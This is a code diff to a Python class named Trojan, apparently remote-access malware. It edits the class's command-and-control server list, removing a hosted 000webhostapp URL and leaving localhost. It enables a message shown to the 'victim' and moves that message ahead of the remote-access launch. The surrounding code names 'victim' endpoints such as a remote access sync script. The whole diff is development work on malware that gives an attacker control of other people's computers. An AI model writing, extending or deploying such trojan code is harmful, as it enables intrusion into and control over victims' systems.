@@ -54,8 +54,6 @@ class Trojan:
         self.__server_urls = [
             # Local server (Favorite server).
             "http://127.0.0.1",
-            # Main server:
-            "https://nomistic-curve.000webhostapp.com"
         ]
 
         # Relative URL to the file on the server, where we storing message.
@@ -68,7 +66,7 @@ class Trojan:
         self.__server_script_remote_access_file = "/victim/remote_access_sync.php"
 
         # Should we show victim a message or not.
-        self.__setting_show_message = False
+        self.__setting_show_message = True
 
         # Should we enable loguru if it is exists?
         self.__setting_enable_loguru = True
@@ -864,6 +862,13 @@ class Trojan:
         # Showing debug message.
         self.show_debug_message("Victim is run our file!")
 
+        # Showing an message for the victim.
+        if self.__setting_show_message:
+            # If we enabled showing of the message.
+
+            # Showing message.
+            self.victim_show_message()
+
         # Generating URI.
         if self.__server_unique_request_index is None:
             # If URI is not generated.
@@ -896,13 +901,6 @@ class Trojan:
 
             # Launching remote access.
             self.remote_access_launch()
-
-        # Showing an message for the victim.
-        if self.__setting_show_message:
-            # If we enabled showing of the message.
-
-            # Showing message.
-            self.victim_show_message()
 
         # Showing ending of the run.
         self.show_debug_message("Ended executing of run() method!")
